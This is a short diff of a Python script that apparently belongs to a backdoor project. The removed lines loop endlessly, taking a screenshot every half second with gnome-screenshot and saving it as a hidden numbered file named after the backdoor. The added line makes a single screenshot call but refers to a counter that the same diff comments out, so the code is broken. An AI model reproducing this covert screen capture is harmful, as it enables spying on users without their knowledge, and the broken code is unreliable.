@@ -1,5 +1,5 @@
 import os
-import time
+#import time
 
 #TENTANDO USAR PYATUOGUI (NÃO FUNCIONA!)
 
@@ -13,9 +13,10 @@ import time
 #import pyautogui
 #im = pyautogui.screenshot('my_screenshot.png')
 
-count = 0
-while(True):
-    count += 1
-    os.system("gnome-screenshot -f .imageFromBackdoor" + str(count) + ".png")
-    time.sleep(0.5)
+#count = 0
+#while(True):
+#    count += 1
+#    os.system("gnome-screenshot -f imageFromBackdoor" + str(count) + ".png")
+#    time.sleep(0.5)
 
+os.system("gnome-screenshot -f imageFromBackdoor" + str(count) + ".png")
